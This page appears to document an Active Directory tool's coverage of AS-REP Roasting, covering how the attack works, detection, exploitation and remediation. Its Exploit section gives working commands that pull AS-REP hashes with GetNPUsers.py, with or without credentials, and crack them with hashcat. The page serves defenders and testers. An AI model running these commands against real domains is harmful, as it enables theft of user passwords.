# AS-REP Roasting

**MITRE:** T1558.004

## How it works

When a user account has `Do not require Kerberos preauthentication` enabled, the KDC will respond to an AS-REQ without verifying the requester's identity. The response contains data encrypted with the user's password hash — crackable offline.

Unlike Kerberoasting, this does not require any credentials at all.

```
Attacker → KDC: AS-REQ for victim (no timestamp, no preauth)
KDC → Attacker: AS-REP with enc-part encrypted with victim's hash
Attacker → hashcat: crack offline
```

## Detection with adpath

```bash
adpath kerberos -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

adpath finds all enabled accounts with `userAccountControl` flag `DONT_REQ_PREAUTH` (0x400000) set.

## Exploit

```bash
# Get hashes — requires any domain account
GetNPUsers.py corp.local/jdoe:'Password1' -dc-ip 10.0.0.1 -request -outputfile asrep.txt

# No credentials at all (username list only)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass -outputfile asrep.txt

# Crack (hashcat)
hashcat -m 18200 asrep.txt wordlist.txt
```

## Remediation

1. Enable Kerberos pre-authentication on all accounts — this flag should almost never be disabled
2. If a legacy application requires it, ensure the account has a strong password and is monitored
